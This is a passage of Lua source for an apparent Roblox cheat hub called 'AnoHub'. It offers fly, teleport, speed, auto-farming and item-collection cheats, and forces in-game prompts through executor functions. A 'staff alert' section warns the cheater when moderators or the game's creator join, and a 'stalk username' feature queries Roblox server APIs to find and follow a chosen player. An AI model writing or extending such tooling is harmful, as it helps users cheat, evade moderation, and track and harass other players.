                statsCounter.fliesActivated = statsCounter.fliesActivated + 1
                local bv = Instance.new("BodyVelocity")
                bv.Name = "AnoHubFly"
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bv.Velocity = Vector3.new(0, 0, 0)
                bv.Parent = hrp
                if _G.flyLoop then _G.flyLoop:Disconnect() end
                _G.flyLoop = RunService.RenderStepped:Connect(function()
                    local c = LocalPlayer.Character
                    if not c then return end
                    local root = c:FindFirstChild("HumanoidRootPart")
                    if not root then return end
                    local b = root:FindFirstChild("AnoHubFly")
                    if not b then return end
                    local cam = Camera
                    local move = Vector3.new(0, 0, 0)
                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
                    if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then move = move - Vector3.new(0, 1, 0) end
                    b.Velocity = move * _G.flySpeed
                end)
            else
                if _G.flyLoop then _G.flyLoop:Disconnect() _G.flyLoop = nil end
                local ch = LocalPlayer.Character
                if ch then
                    local hrp = ch:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local bv = hrp:FindFirstChild("AnoHubFly")
                        if bv then bv:Destroy() end
                    end
                end
            end
        end,
    })

    MiscLeft:AddToggle("AntiGravity", {
        Text = "Anti Gravity", Default = false,
        Tooltip = "Disables gravity",
        Callback = function(Value) if Value then Workspace.Gravity = 0 else Workspace.Gravity = 196.2 end end,
    })

    MiscLeft:AddToggle("ClickTP", {
        Text = "Click TP", Default = false,
        Tooltip = "Teleport on mouse click",
        Callback = function(Value)
            _G.clickTPActive = Value
            if Value then
                statsCounter.clickTPUses = (statsCounter.clickTPUses or 0) + 1
            end
        end,
    })

    MiscLeft:AddToggle("Shake", {
        Text = "Shake", Default = false,
        Tooltip = "Camera shake (anti-detect)",
        Callback = function(Value) _G.shakeActive = Value end,
    })

    MiscLeft:AddSlider("ShakeRange", {
        Text = "Shake Range", Default = 15, Min = 1, Max = 100, Rounding = 0,
        Tooltip = "Shake strength",
        Callback = function(Value) _G.shakeRange = Value end,
    })

    MiscLeft:AddToggle("AntiVoid", {
        Text = "Anti-Void", Default = false,
        Tooltip = "Prevents falling into void",
        Callback = function(Value)
            _G.antiVoidActive = Value
            if Value then
                if _G.antiVoidConn then _G.antiVoidConn:Disconnect() end
                _G.antiVoidConn = RunService.Stepped:Connect(function()
                    local ch = LocalPlayer.Character
                    if not ch then return end
                    local hrp = ch:FindFirstChild("HumanoidRootPart")
                    if not hrp then return end
                    local dh = workspace.FallenPartsDestroyHeight
                    if hrp.Position.Y <= dh + 25 then hrp.Velocity = hrp.Velocity + Vector3.new(0, 250, 0) end
                end)
                Library:Notify("Anti-Void enabled", 5)
            else
                if _G.antiVoidConn then _G.antiVoidConn:Disconnect() _G.antiVoidConn = nil end
                Library:Notify("Anti-Void disabled", 5)
            end
        end,
    })

    MiscLeft:AddToggle("TPWalk", {
        Text = "TP Walk", Default = false,
        Tooltip = "Fast walking (teleport steps)",
        Callback = function(Value)
            _G.tpWalkActive = Value
            if Value then
                if _G.tpWalkConn then _G.tpWalkConn:Disconnect() end
                _G.tpWalkSpeed = _G.tpWalkSpeed or 1
                _G.tpWalkConn = RunService.Heartbeat:Connect(function(delta)
                    local ch = LocalPlayer.Character
                    if not ch then return end
                    local hum = ch:FindFirstChildOfClass("Humanoid")
                    if not hum then return end
                    if hum.MoveDirection.Magnitude > 0 then ch:TranslateBy(hum.MoveDirection * _G.tpWalkSpeed * delta * 2) end
                end)
                Library:Notify("TP Walk enabled", 5)
            else
                if _G.tpWalkConn then _G.tpWalkConn:Disconnect() _G.tpWalkConn = nil end
                Library:Notify("TP Walk disabled", 5)
            end
        end,
    })

    MiscLeft:AddSlider("TPWalkSpeed", {
        Text = "TP Walk Speed", Default = 1, Min = 1, Max = 350, Rounding = 0,
        Tooltip = "TP Walk speed",
        Callback = function(Value) _G.tpWalkSpeed = Value end,
    })

    RunService.RenderStepped:Connect(function()
        if not _G.shakeActive then _G.lastCamCFrame = nil return end
        local ch = LocalPlayer.Character
        if ch then
            local hum = ch:FindFirstChildOfClass("Humanoid")
            if hum then hum.CameraOffset = Vector3.new(0,0,0) end
        end
        local cam = Workspace.CurrentCamera
        if not cam then return end
        local current = cam.CFrame
        if _G.lastCamCFrame then
            local pd = (current.Position - _G.lastCamCFrame.Position).Magnitude
            if pd > 0.01 and pd < _G.shakeRange then
                cam.CFrame = CFrame.new(_G.lastCamCFrame.Position, current.Position + current.LookVector)
            end
        end
        _G.lastCamCFrame = cam.CFrame
    end)

    UserInputService.InputBegan:Connect(function(input, gp)
        if gp then return end
        if not _G.clickTPActive then return end
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
        local mouse = LocalPlayer:GetMouse()
        if mouse and mouse.Hit then
            local ch = LocalPlayer.Character
            if ch then
                local hrp = ch:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 3, 0)) end
            end
        end
    end)

    local ServerHopGroup = MiscTab:AddLeftGroupbox("Auto Server Hop")

    _G.ServerHop = _G.ServerHop or {
        Enabled = false,
        MinPlayers = 0,
        MaxPing = 0,
        OnDeathStreak = 0,
        StalkUser = "",
        CooldownSec = 30,
        LastHop = 0,
        DeathStreak = 0,
    }

    local function ServerHop_getServers()
        local ok, req = pcall(function()
            return game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
        end)
        if not ok or not req then return {} end
        local ok2, body = pcall(function() return _G.HttpService:JSONDecode(req) end)
        if not ok2 or not body or not body.data then return {} end
        local servers = {}
        for _, v in pairs(body.data) do
            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers)
                and v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(servers, {
                    id = v.id,
                    playing = tonumber(v.playing),
                    maxPlayers = tonumber(v.maxPlayers),
                    ping = tonumber(v.ping) or 0,
                })
            end
        end
        return servers
    end

    local function ServerHop_doHop(reason)
        if tick() - _G.ServerHop.LastHop < _G.ServerHop.CooldownSec then return end
        _G.ServerHop.LastHop = tick()
        statsCounter.autoHops = (statsCounter.autoHops or 0) + 1
        Library:Notify("AutoHop: " .. reason, 5)
        local servers = ServerHop_getServers()
        if #servers == 0 then
            Library:Notify("AutoHop: no servers found", 5)
            return
        end
        local picked = servers[math.random(1, #servers)].id
        pcall(function()
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, picked, LocalPlayer)
        end)
    end

    ServerHopGroup:AddToggle("AutoServerHop", {
        Text = "Enable Auto Server Hop",
        Default = false,
        Tooltip = "Automatically hops when conditions met",
        Callback = function(Value)
            _G.ServerHop.Enabled = Value
            Library:Notify("Auto Server Hop: " .. (Value and "ON" or "OFF"), 4)
        end,
    })

    ServerHopGroup:AddSlider("AutoHopMinPlayers", {
        Text = "Hop if players < N (0=off)",
        Default = 0, Min = 0, Max = 30, Rounding = 0,
        Tooltip = "Hop if player count is below this",
        Callback = function(Value) _G.ServerHop.MinPlayers = Value end,
    })

    ServerHopGroup:AddSlider("AutoHopMaxPing", {
        Text = "Hop if ping > N ms (0=off)",
        Default = 0, Min = 0, Max = 1000, Rounding = 0,
        Tooltip = "Hop if your ping is above this",
        Callback = function(Value) _G.ServerHop.MaxPing = Value end,
    })

    ServerHopGroup:AddSlider("AutoHopDeathStreak", {
        Text = "Hop after N deaths (0=off)",
        Default = 0, Min = 0, Max = 20, Rounding = 0,
        Tooltip = "Hop after dying this many times in a row",
        Callback = function(Value) _G.ServerHop.OnDeathStreak = Value end,
    })

    ServerHopGroup:AddSlider("AutoHopCooldown", {
        Text = "Cooldown (sec)",
        Default = 30, Min = 5, Max = 300, Rounding = 0,
        Tooltip = "Min time between hops",
        Callback = function(Value) _G.ServerHop.CooldownSec = Value end,
    })

    ServerHopGroup:AddInput("AutoHopStalk", {
        Text = "Stalk username (empty=off)",
        Default = "", Placeholder = "Username",
        Numeric = false, Finished = true,
        Tooltip = "Hop to servers where this player is",
        Callback = function(Value)
            _G.ServerHop.StalkUser = tostring(Value or ""):gsub("%s", "")
        end,
    })

    ServerHopGroup:AddButton({
        Text = "Hop Now",
        Tooltip = "Immediately hop to a random server",
        Func = function()
            _G.ServerHop.LastHop = 0
            ServerHop_doHop("Manual hop")
        end,
    })

    LocalPlayer.CharacterAdded:Connect(function(char)
        local hum = char:WaitForChild("Humanoid", 5)
        if hum then
            hum.Died:Connect(function()
                _G.ServerHop.DeathStreak = (_G.ServerHop.DeathStreak or 0) + 1
                if _G.ServerHop.Enabled and _G.ServerHop.OnDeathStreak > 0
                    and _G.ServerHop.DeathStreak >= _G.ServerHop.OnDeathStreak then
                    _G.ServerHop.DeathStreak = 0
                    ServerHop_doHop("died " .. _G.ServerHop.OnDeathStreak .. " times")
                end
            end)
            _G.ServerHop.DeathStreak = 0
        end
    end)

    task.spawn(function()
        while task.wait(10) do
            if not _G.ServerHop.Enabled then continue end

            if _G.ServerHop.MinPlayers > 0 then
                local count = #Players:GetPlayers()
                if count < _G.ServerHop.MinPlayers then
                    ServerHop_doHop("players " .. count .. " < " .. _G.ServerHop.MinPlayers)
                    continue
                end
            end

            if _G.ServerHop.MaxPing > 0 then
                local ping = 0
                pcall(function()
                    local s = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                    ping = tonumber(s:match("(%d+)")) or 0
                end)
                if ping > _G.ServerHop.MaxPing then
                    ServerHop_doHop("ping " .. ping .. " > " .. _G.ServerHop.MaxPing)
                    continue
                end
            end

            if _G.ServerHop.StalkUser ~= "" then
                pcall(function()
                    local target = _G.ServerHop.StalkUser:lower()
                    local found = false
                    for _, plr in ipairs(Players:GetPlayers()) do
                        if plr.Name:lower() == target then
                            found = true
                            break
                        end
                    end
                    if found then
                        Library:Notify("Stalk: " .. _G.ServerHop.StalkUser .. " found in server!", 8)
                        return
                    end

                    local req = (syn and syn.request) or (http and http.request) or http_request or request
                    if not req then return end

                    local ok, resp = pcall(function()
                        return req({
                            Url = "https://users.roblox.com/v1/usernames/users",
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = _G.HttpService:JSONEncode({ usernames = { _G.ServerHop.StalkUser }, excludeBannedUsers = false }),
                        })
                    end)
                    if not ok or not resp then return end
                    local respBody = resp.Body or resp.body
                    if not respBody then return end
                    local data = _G.HttpService:JSONDecode(respBody)
                    local targetId = nil
                    if data and data.data and data.data[1] then
                        targetId = data.data[1].id
                    end
                    if not targetId then return end

                    local srvResp = req({
                        Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true",
                        Method = "GET",
                    })
                    if not srvResp then return end
                    local srvBody = srvResp.Body or srvResp.body
                    if not srvBody then return end
                    local srvData = _G.HttpService:JSONDecode(srvBody)
                    if not srvData or not srvData.data then return end

                    for _, server in ipairs(srvData.data) do
                        if server.id and server.id ~= game.JobId then
                            pcall(function()
                                local pResp = req({
                                    Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/" .. server.id .. "/players",
                                    Method = "GET",
                                })
                                if pResp then
                                    local pBody = pResp.Body or pResp.body
                                    if pBody then
                                        local pData = _G.HttpService:JSONDecode(pBody)
                                        if pData and pData.data then
                                            for _, p in ipairs(pData.data) do
                                                if p.id == targetId then
                                                    Library:Notify("Stalk: found " .. _G.ServerHop.StalkUser .. "! Hopping...", 8)
                                                    statsCounter.autoHops = (statsCounter.autoHops or 0) + 1
                                                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
                                                    return
                                                end
                                            end
                                        end
                                    end
                                end
                            end)
                        end
                    end
                end)
            end
        end
    end)
	    local FarmGroup = MiscTab:AddLeftGroupbox("Farm")
    FarmGroup:AddToggle("FarmMoney", {
        Text = "Farm Money", Default = false,
        Tooltip = "Auto farm money (needs auto clicker on deploy + D-Class)",
        Callback = function(Value)
            _G.isFarming = Value
            _G.farming = Value
            if _G.isFarming then
                statsCounter.farmsStarted = statsCounter.farmsStarted + 1
                task.spawn(_G.farmLoop)
            end
        end,
    })
    FarmGroup:AddLabel("You need auto clicker on the deploy button + d class selected!", true)
    FarmGroup:AddButton({
        Text = "Escape",
        Tooltip = "Teleport to Escape point",
        Func = function()
            Library:Notify("Escaping...")
            statsCounter.escapesDone = statsCounter.escapesDone + 1
            task.spawn(_G.escapeDoor)
        end,
    })

    local MiscRight = MiscTab:AddRightGroupbox("Aura")
    MiscRight:AddSlider("AuraRadius", {
        Text = "Radius", Default = 15, Min = 5, Max = 100, Rounding = 0,
        Tooltip = "Item collect radius around you",
        Callback = function(Value) _G.auraR = Value end,
    })
    MiscRight:AddToggle("AuraToggle", {
        Text = "Aura Collect", Default = false,
        Tooltip = "Auto collect items in radius",
        Callback = function(Value) if Value then _G.startAura() else _G.stopAura() end end,
    })

    local LootFilterGroup = MiscTab:AddRightGroupbox("Loot Filter")
    for key, item in pairs(items) do
        LootFilterGroup:AddToggle("LF_" .. key, {
            Text = item.Name, Default = item.Enabled,
            Tooltip = "Collect " .. item.Name,
            Callback = function(Value)
                item.Enabled = Value
                if _G.itemsESPActive then _G.updateItemsCache() _G.updateItemsHL() end
            end,
        })
    end
    LootFilterGroup:AddDivider()
    LootFilterGroup:AddButton({
        Text = "Collect Items",
        Tooltip = "Collect all items and return to start position (buggy, use 2-4 times)",
        Func = function()
            if _G.collecting then return end
            Library:Notify("Collecting...")
            task.spawn(_G.startCollect)
        end,
    })

    local ExtraGroup = MiscTab:AddLeftGroupbox("Extra")

    local PartRemoverFilter = {
        ["Door"] = {
            exact = {"Door1","Door2","Door3","Door4","ScpDoor1","ScpDoor2","ScpDoor3","ScpDoor4","ScpBunkerDoors","BrutalDoor","Brutal Door","BrutalDoors"},
            contains = {}, exclude = {},
        },
        ["Hostile Trigger"] = { exact = {"Hostile"}, contains = {}, exclude = {} },
        ["Escape Trigger"] = { exact = {"Escape"}, contains = {}, exclude = {} },
    }
    local PartRemoverEnabled = { ["Door"] = false, ["Hostile Trigger"] = false, ["Escape Trigger"] = false }
    local PartRemoverHidden = {}

    local function PartRemoverGetActive()
        local exact, contains, exclude = {}, {}, {}
        for cat, on in pairs(PartRemoverEnabled) do
            if on and PartRemoverFilter[cat] then
                for _, n in ipairs(PartRemoverFilter[cat].exact or {}) do exact[n:lower()] = cat end
                for _, n in ipairs(PartRemoverFilter[cat].contains or {}) do contains[n:lower()] = cat end
                for _, n in ipairs(PartRemoverFilter[cat].exclude or {}) do exclude[n:lower()] = cat end
            end
        end
        return exact, contains, exclude
    end
    local function PartRemoverMatches(name)
        name = name:lower()
        local exact, contains, exclude = PartRemoverGetActive()
        for ex, _ in pairs(exclude) do if name:find(ex, 1, true) then return false end end
        if exact[name] then return true end
        for sub, _ in pairs(contains) do if name:find(sub, 1, true) then return true end end
        return false
    end
    local function PartRemoverHide(inst)
        if PartRemoverHidden[inst] then return end
        if inst:IsDescendantOf(LocalPlayer.Character) then return end
        if not (inst:IsA("BasePart") or inst:IsA("Model")) then return end
        if PartRemoverMatches(inst.Name) then
            PartRemoverHidden[inst] = inst.Parent
            inst.Parent = nil
        end
    end
    local function PartRemoverRestore(inst)
        local p = PartRemoverHidden[inst]
        if p and p.Parent ~= nil then pcall(function() inst.Parent = p end) end
        PartRemoverHidden[inst] = nil
    end
    local function PartRemoverApply()
        for _, obj in pairs(Workspace:GetDescendants()) do
            if PartRemoverMatches(obj.Name) then PartRemoverHide(obj) end
        end
        for inst, _ in pairs(PartRemoverHidden) do
            if not PartRemoverMatches(inst.Name) then PartRemoverRestore(inst) end
        end
    end

    Workspace.DescendantAdded:Connect(function(obj)
        task.wait(0.05)
        if PartRemoverMatches(obj.Name) then PartRemoverHide(obj) end
    end)

    ExtraGroup:AddLabel("Part Remover (Local)", true)
    ExtraGroup:AddToggle("PR_Door", { Text = "Doors", Default = false, Tooltip = "Removes doors locally", Callback = function(v) PartRemoverEnabled["Door"] = v PartRemoverApply() end })
    ExtraGroup:AddToggle("PR_Hostile", { Text = "Hostile Trigger", Default = false, Tooltip = "Removes Hostile triggers", Callback = function(v) PartRemoverEnabled["Hostile Trigger"] = v PartRemoverApply() end })
    ExtraGroup:AddToggle("PR_Escape", { Text = "Escape Trigger", Default = false, Tooltip = "Removes Escape triggers", Callback = function(v) PartRemoverEnabled["Escape Trigger"] = v PartRemoverApply() end })

    local AutoMaskActive = false
    local AutoMaskRunning = false
    local AutoMaskHasAnomaly = false
    local AutoMaskTarget = "SCP-035"
    local AutoMaskWait = 4
    local AutoMaskOffset = Vector3.new(0, 3, 0)

    local function AutoMaskGetRole(plr)
        local r = plr:GetAttribute("Role")
        if r and r ~= "" then return string.lower(tostring(r)) end
        return "unknown"
    end
    local function AutoMaskHasNoRole(plr)
        local r = AutoMaskGetRole(plr)
        return r == "unknown" or r == "neutral" or r == ""
    end
    local function AutoMaskFindTarget()
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj.Name == AutoMaskTarget then
                if obj:IsA("BasePart") then return obj end
                if obj:IsA("Model") then
                    local p = obj:FindFirstChildWhichIsA("BasePart", true)
                    if p then return p end
                end
            end
        end
        return nil
    end
    local function AutoMaskTeleport(part)
        local ch = LocalPlayer.Character
        if not ch then return false end
        local hrp = ch:FindFirstChild("HumanoidRootPart")
        if not hrp then return false end
        hrp.CFrame = part.CFrame + AutoMaskOffset
        return true
    end
    local function AutoMaskInteract(part)
        local prompt = part:FindFirstChildWhichIsA("ProximityPrompt", true)
        if prompt then
            pcall(function()
                if fireproximityprompt then fireproximityprompt(prompt)
                else
                    prompt.HoldDuration = 0
                    prompt.RequiresLineOfSight = false
                    prompt.MaxActivationDistance = 100
                    prompt:InputHoldBegin()
                    task.wait(0.01)
                    prompt:InputHoldEnd()
                end
            end)
            return true
        end
        local cd = part:FindFirstChildWhichIsA("ClickDetector", true)
        if cd and fireclickdetector then
            pcall(function() fireclickdetector(cd) end)
            return true
        end
        return true
    end
    local function AutoMaskLoop()
        if AutoMaskRunning then return end
        AutoMaskRunning = true
        while AutoMaskActive do
            local target = AutoMaskFindTarget()
            if not target then task.wait(2) continue end
            if not AutoMaskTeleport(target) then task.wait(1) continue end
            task.wait(0.3)
            AutoMaskInteract(target)
            task.wait(AutoMaskWait)
            local role = AutoMaskGetRole(LocalPlayer)
            if role == "anomaly" then
                AutoMaskHasAnomaly = true
                AutoMaskRunning = false
                Library:Notify("AutoMask: became anomaly, stopped", 5)
                return
            end
            if AutoMaskHasNoRole(LocalPlayer) then
                local t = tick()
                while AutoMaskActive and not AutoMaskHasAnomaly and AutoMaskHasNoRole(LocalPlayer) and tick() - t < 30 do
                    task.wait(0.5)
                end
            end
            task.wait(1)
        end
        AutoMaskRunning = false
    end

    ExtraGroup:AddToggle("AutoMask", {
        Text = "Auto Obtaining Mask", Default = false,
        Tooltip = "Automatically obtains mask (SCP-035)",
        Callback = function(Value)
            AutoMaskActive = Value
            if Value then
                AutoMaskHasAnomaly = false
                AutoMaskRunning = false
                task.spawn(AutoMaskLoop)
                Library:Notify("AutoMask enabled", 5)
            else
                AutoMaskActive = false
                Library:Notify("AutoMask disabled", 5)
            end
        end,
    })
    ExtraGroup:AddSlider("AutoMaskWait", {
        Text = "AutoMask Wait (sec)", Default = 4, Min = 1, Max = 10, Rounding = 0,
        Tooltip = "Delay between attempts",
        Callback = function(Value) AutoMaskWait = Value end,
    })
    ExtraGroup:AddInput("AutoMaskTarget", {
        Text = "Target Name", Default = "SCP-035", Placeholder = "SCP-035",
        Numeric = false, Finished = true,
        Tooltip = "Object name to interact with",
        Callback = function(Value) if Value and Value ~= "" then AutoMaskTarget = Value end end,
    })

    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(2)
        if AutoMaskActive then
            AutoMaskHasAnomaly = false
            AutoMaskRunning = false
            task.spawn(AutoMaskLoop)
        end
    end)

    _G.staffAlertActive = true

    local function announceStaffJoin(plr)
        if plr == LocalPlayer then return end
        if _G.isHiddenDev and _G.isHiddenDev(plr) then return end
        if staffNotified[plr.UserId] then return end
        local displayName = plr.DisplayName or plr.Name
        local username = plr.Name

        if _G.isCreator(plr) then
            staffNotified[plr.UserId] = true
            local creatorText = "Creator joined - " .. displayName .. " (@" .. username .. ")"
            pcall(function() StarterGui:SetCore("SendNotification", { Title = "CREATOR JOINED", Text = creatorText, Duration = 25 }) end)
            pcall(function() Library:Notify(creatorText, 25) end)
            pcall(function()
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = creatorText,
                    Color = Color3.fromRGB(215, 110, 0),
                    Font = Enum.Font.GothamBold,
                    TextSize = 20,
                })
            end)
            return
        end

        if not _G.isStaff(plr) then return end
        staffNotified[plr.UserId] = true
        local role = _G.getStaffRoleName(plr) or "Staff"
        pcall(function() StarterGui:SetCore("SendNotification", { Title = "STAFF ALERT", Text = role .. " joined - " .. displayName, Duration = 15 }) end)
        pcall(function() Library:Notify("STAFF JOINED (" .. role .. "): " .. displayName, 15) end)
    end

    local function announceRoleChange(plr)
        if plr == LocalPlayer then return end
        if _G.isHiddenDev and _G.isHiddenDev(plr) then return end
        local role = _G.getPlayerRole(plr)
        if not role or role == "neutral" or role == "unknown" then return end
        if not roleAlertFilter[role] then return end
        local key = plr.UserId .. "_" .. role
        if _G.roleAlerted[key] then return end
        _G.roleAlerted[key] = true
        local displayName = plr.DisplayName or plr.Name
        pcall(function() Library:Notify("ROLE: " .. displayName .. " joined as " .. _G.getRoleDisplay(role), 10) end)
        pcall(function() StarterGui:SetCore("SendNotification", { Title = "ROLE ALERT", Text = displayName .. " - " .. _G.getRoleDisplay(role), Duration = 10 }) end)
    end

    Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function()
            task.wait(1.5)
            if _G.staffAlertActive then announceStaffJoin(plr) end
            announceRoleChange(plr)
            task.wait(2)
            announceRoleChange(plr)
            task.wait(3)
            announceRoleChange(plr)
        end)
        task.wait(0.5)
        if _G.staffAlertActive then announceStaffJoin(plr) end
        announceRoleChange(plr)
        plr.AttributeChanged:Connect(function()
            announceRoleChange(plr)
            if _G.staffAlertActive then announceStaffJoin(plr) end
        end)
        if _G.updateLockOnTargets then _G.updateLockOnTargets() end
        if _G.updateGotoList then _G.updateGotoList() end
        if _G.updateWLList then _G.updateWLList() end
        if _G.updateSpecList then _G.updateSpecList() end
    end)

    task.spawn(function()
        while task.wait(2) do
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer then
                    if _G.staffAlertActive then announceStaffJoin(plr) end
                    announceRoleChange(plr)
                end
            end
        end
    end)

    Players.PlayerRemoving:Connect(function(plr)
        _G.removePlayerESP(plr)
        if _G.updateLockOnTargets then _G.updateLockOnTargets() end
        if _G.updateGotoList then _G.updateGotoList() end
        if _G.updateWLList then _G.updateWLList() end
        if _G.updateSpecList then _G.updateSpecList() end
        _G.groupRoleCache[plr.UserId] = nil
    end)

    task.spawn(function()
        while task.wait(5) do
            pcall(function() if _G.updateLockOnTargets then _G.updateLockOnTargets() end end)
            pcall(function() if _G.updateGotoList then _G.updateGotoList() end end)
            pcall(function() if _G.updateWLList then _G.updateWLList() end end)
            pcall(function() if _G.updateSpecList then _G.updateSpecList() end end)
        end
    end)

    task.spawn(function()
        task.wait(3)
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and _G.staffAlertActive then announceStaffJoin(plr) end
        end
    end)
	    local AchTab = Tabs.Achievements

    if AchTab then
        local ACH_FILE = "AnoHub_achievements.json"
        local Unlocked = {}
        local TotalXP = 0

        local function loadAch()
            pcall(function()
                if readfile and isfile and isfile(ACH_FILE) then
                    local data = readfile(ACH_FILE)
                    if data and data ~= "" then
                        local ok, parsed = pcall(function() return HttpService:JSONDecode(data) end)
                        if ok and type(parsed) == "table" then
                            Unlocked = parsed.unlocked or {}
                            TotalXP  = parsed.totalXP or 0
                        end
                    end
                end
            end)
        end

        local function saveAch()
            pcall(function()
                if writefile then
                    writefile(ACH_FILE, HttpService:JSONEncode({
                        unlocked = Unlocked,
                        totalXP  = TotalXP,
                    }))
                end
            end)
        end

        loadAch()

        local function getLevelInfo(xp)
            local level = 1
            local needed = 100
            local totalForLevel = 0
            while xp >= totalForLevel + needed do
                totalForLevel = totalForLevel + needed
                level = level + 1
                needed = needed + 50
            end
            return level, xp - totalForLevel, needed
        end

        local function getRank(level)
            if level >= 50 then return "LEGEND" end
            if level >= 40 then return "MYTHIC" end
            if level >= 30 then return "DIAMOND" end
            if level >= 20 then return "GOLD" end
            if level >= 15 then return "SILVER" end
            if level >= 10 then return "BRONZE" end
            if level >= 5  then return "APPRENTICE" end
            return "NOVICE"
        end

        local Achievements = {
            {id="fly1",     name="First Flight",       desc="Activate Fly once",             xp=10,    check=function() return (statsCounter.fliesActivated or 0) >= 1 end},
            {id="fly50",    name="Frequent Flyer",     desc="Fly 50 times",                  xp=50,    check=function() return (statsCounter.fliesActivated or 0) >= 50 end},
            {id="fly500",   name="Sky Master",         desc="Fly 500 times",                 xp=200,   check=function() return (statsCounter.fliesActivated or 0) >= 500 end},
            {id="noclip1",  name="Ghost",              desc="Use Noclip once",               xp=10,    check=function() return (statsCounter.noclipsActivated or 0) >= 1 end},
            {id="noclip100",name="Phasing",            desc="Use Noclip 100 times",          xp=100,   check=function() return (statsCounter.noclipsActivated or 0) >= 100 end},
            {id="noclip1000",name="Intangible",        desc="Use Noclip 1000 times",         xp=500,   check=function() return (statsCounter.noclipsActivated or 0) >= 1000 end},
            {id="swim",     name="Amphibious",         desc="Use Swim",                      xp=15,    check=function() return _G.swimActive == true end},
            {id="tp10",     name="Teleporter",         desc="Teleport 10 times",             xp=20,    check=function() return (statsCounter.teleports or 0) >= 10 end},
            {id="tp100",    name="Globetrotter",       desc="Teleport 100 times",            xp=100,   check=function() return (statsCounter.teleports or 0) >= 100 end},
            {id="tp1000",   name="Space Walker",       desc="Teleport 1000 times",           xp=500,   check=function() return (statsCounter.teleports or 0) >= 1000 end},
            {id="tp10000",  name="Reality Bender",     desc="Teleport 10000 times",          xp=2000,  check=function() return (statsCounter.teleports or 0) >= 10000 end},
            {id="aim1",     name="Trigger Happy",      desc="Activate Aimbot once",          xp=10,    check=function() return (statsCounter.aimbotActivations or 0) >= 1 end},
            {id="aim100",   name="Sharpshooter",       desc="Activate Aimbot 100 times",     xp=75,    check=function() return (statsCounter.aimbotActivations or 0) >= 100 end},
            {id="aim1000",  name="Terminator",         desc="Activate Aimbot 1000 times",    xp=300,   check=function() return (statsCounter.aimbotActivations or 0) >= 1000 end},
            {id="aim10000", name="Aim God",            desc="Activate Aimbot 10000 times",   xp=1000,  check=function() return (statsCounter.aimbotActivations or 0) >= 10000 end},
            {id="lockon1",  name="Locked On",          desc="Use Lock-On once",              xp=15,    check=function() return (statsCounter.lockOnActivations or 0) >= 1 end},
            {id="lockon50", name="Target Locked",      desc="Use Lock-On 50 times",          xp=100,   check=function() return (statsCounter.lockOnActivations or 0) >= 50 end},
            {id="spinbot1", name="Spin Cycle",         desc="Enable Spinbot",                xp=20,    check=function() return (statsCounter.spinbotActivations or 0) >= 1 end},
            {id="spinbot100",name="Dizzy",             desc="Enable Spinbot 100 times",      xp=150,   check=function() return (statsCounter.spinbotActivations or 0) >= 100 end},
            {id="col1",     name="Collector",          desc="Collect items once",            xp=15,    check=function() return (statsCounter.collects or 0) >= 1 end},
            {id="col50",    name="Hoarder",            desc="Collect 50 times",              xp=80,    check=function() return (statsCounter.collects or 0) >= 50 end},
            {id="col500",   name="Treasure Hunter",    desc="Collect 500 times",             xp=400,   check=function() return (statsCounter.collects or 0) >= 500 end},
            {id="col1000",  name="Ultimate Collector", desc="Collect 1000 items",             xp=2000,  check=function() return (statsCounter.collects or 0) >= 1000 end},
            {id="col5000",  name="Ultimate Hoarder",   desc="Collect 5000 items",            xp=5000,  check=function() return (statsCounter.collects or 0) >= 5000 end},
            {id="aura1",    name="Aura Activated",     desc="Use Aura Collect",              xp=25,    check=function() return _G.auraActive == true end},
            {id="aura100",  name="Magnet",             desc="Use Aura for 10 minutes total", xp=200,   check=function() return (statsCounter.auraSeconds or 0) >= 600 end},
            {id="aura1000", name="Aura God",           desc="Use Aura for 1 hour total",     xp=800,   check=function() return (statsCounter.auraSeconds or 0) >= 3600 end},
            {id="esc1",     name="Escape Artist",      desc="Escape once",                   xp=20,    check=function() return (statsCounter.escapesDone or 0) >= 1 end},
            {id="esc50",    name="Freedom",            desc="Escape 50 times",               xp=150,   check=function() return (statsCounter.escapesDone or 0) >= 50 end},
            {id="esc500",   name="Escape Master",      desc="Escape 500 times",              xp=600,   check=function() return (statsCounter.escapesDone or 0) >= 500 end},
            {id="esc1000",  name="Legendary Escape",   desc="Escape 1000 times",             xp=1500,  check=function() return (statsCounter.escapesDone or 0) >= 1000 end},
            {id="esc5000",  name="Escape Deity",       desc="Escape 5000 times",             xp=8000,  check=function() return (statsCounter.escapesDone or 0) >= 5000 end},
            {id="hop10",    name="Server Hopper",      desc="Server hop 10 times",           xp=40,    check=function() return (statsCounter.serverHops or 0) >= 10 end},
            {id="hop100",   name="Dimension Jumper",   desc="Server hop 100 times",          xp=200,   check=function() return (statsCounter.serverHops or 0) >= 100 end},
